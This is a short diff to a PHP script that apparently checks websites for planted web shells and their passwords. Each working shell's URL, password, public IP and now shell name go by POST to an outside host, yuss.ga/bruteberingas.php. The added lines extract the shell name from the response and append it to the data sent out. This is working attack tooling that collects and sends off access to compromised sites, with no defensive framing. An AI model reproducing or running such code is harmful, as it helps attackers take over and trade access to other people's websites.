@@ -42,6 +42,8 @@ function crotz($x)
     $ex = explode(" ",$result->Type);
     $msg = $result->Messages;
     $status = $result->ResponseCode;
+    $type = $result->Type;
+    $type = explode("Shell with passname as ", $type);
 
     if(($result->Status == "success") && $ex[0] == "Shell")
     {
@@ -67,7 +69,7 @@ function crotz($x)
                     curl_setopt($ch, CURLOPT_URL, "http://yuss.ga/bruteberingas.php");
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                     curl_setopt($ch, CURLOPT_POST, 1);
-                    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $key . "&ip=" . exec("curl -s ifconfig.me"));
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $key . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type);
                     $exe = curl_exec($ch);
                     $results = json_decode($exe);
 
